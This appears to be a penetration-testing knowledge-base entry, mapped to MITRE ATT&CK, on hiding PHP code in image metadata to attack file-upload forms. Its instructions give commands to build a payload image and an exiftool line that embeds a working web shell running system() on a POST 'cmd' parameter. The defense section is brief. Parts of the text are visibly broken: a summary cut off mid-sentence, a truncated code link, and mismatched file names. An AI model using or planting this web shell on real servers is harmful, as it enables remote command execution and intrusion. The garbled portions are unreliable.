---
id: ec36931b-2c4b-493c-9342-1c4d93c4b9c4
name: Custom Metadata PHP Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.085505+00:00'
updated_at: '2023-04-10T20:24:34.539846+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Exploits]]'
- '[[Picture with custom metadata]]'
- '[[Upload Insecure Files]]'
commands:
- '[[Add metadata to image]]'
- '[[Create white image with specified size]]'
- '[[Insert PHP code into image metadata]]'
---

# Custom Metadata PHP Injection

## Summary

A common method of uploading images to a website is through a form that allows users to upload files. Attackers can exploit this functionality by uploading an image file with custom metadata that contains PHP code. This code can then be executed on the server when the image is processed. The attack

## Description

# Description

A common method of uploading images to a website is through a form that allows users to upload files. Attackers can exploit this functionality by uploading an image file with custom metadata that contains PHP code. This code can then be executed on the server when the image is processed. The attacker can then gain access to the server and perform further malicious actions. This technique can be used as an initial access vector for an attacker.

## Requirements

1. Access to the target website's file upload functionality

1. Ability to upload files

1. Knowledge of PHP code

## Defense

1. Ensure file upload functionality is secure and properly sanitized

1. Implement input validation and filtering on user input to prevent injection attacks

1. Regularly monitor server logs for suspicious activity

## Objectives

1. Upload an image with custom metadata containing PHP code

1. Execute the PHP code on the server

1. Gain access to the server

# Instructions

1. To customize exif tags in a picture using exiftool, follow these steps:
1. Open the command prompt or terminal window.
2. Navigate to the directory where the picture is located.
3. Type the following command:
exiftool -EXIF:Tag=Value picture_name.jpg
4. Replace 'Tag' with the name of the exif tag you want to customize and 'Value' with the value you want to set for that tag.
5. Hit enter to execute the command.
6. The exif tag in the picture will be customized with the specified value.

**Code**: [[exiftool]]

> Exiftool is a command-line tool used to read, write and edit metadata in image, audio and video files. With exiftool, you can customize exif tags in a picture by specifying the name of the tag and the value you want to set for that tag. This can be useful for adding copyright information, author details, and other metadata to your pictures.

2. To create a payload image with PHP command injection, follow these steps:
1. Use the `convert` command to create a blank white image with a size of 110x110 pixels and save it as `payload.jpg`.
2. Use the `exiftool` command to add metadata to the `payload.jpg` file. Set the `Copyright` field to `PayloadsAllTheThings`, the `Artist` field to `Pentest`, and the `ImageUniqueID` field to `Example`.
3. Use the `exiftool` command again to add a PHP code as a comment to the `img.jpg` file. The PHP code will execute any command passed as a POST parameter named `cmd`.

**Code**: [[convert -size 110x110 xc:white payload.jpg
exiftoo]]

> The `convert` command is a part of ImageMagick software suite that is used to create, edit, and compose bitmap images. In this case, we use it to create a blank white image with a size of 110x110 pixels that will be used as a container for our payload.

The `exiftool` command is a powerful tool for reading, writing, and editing metadata in a wide variety of file formats. In this case, we use it to add metadata to our `payload.jpg` file. The `Copyright` field is set to `PayloadsAllTheThings` to indicate that this is a part of the PayloadsAllTheThings project. The `Artist` field is set to `Pentest` to indicate the author of the payload. The `ImageUniqueID` field is set to `Example` to provide a unique identifier for the file.

Finally, we use the `exiftool` command again to add a PHP code as a comment to the `img.jpg` file. The PHP code will execute any command passed as a POST parameter named `cmd`. This allows us to execute arbitrary commands on the server by simply sending a POST request to the `img.jpg` file with the `cmd` parameter set to the desired command.

**Command** ([[Create white image with specified size]]):

```bash
convert -size 110x110 xc:white payload.jpg
```

**Command** ([[Add metadata to image]]):

```bash
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
```

**Command** ([[Insert PHP code into image metadata]]):

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Add metadata to image]]
- [[Create white image with specified size]]
- [[Insert PHP code into image metadata]]

## Tags

- [[Exploits]]
- [[Picture with custom metadata]]
- [[Upload Insecure Files]]
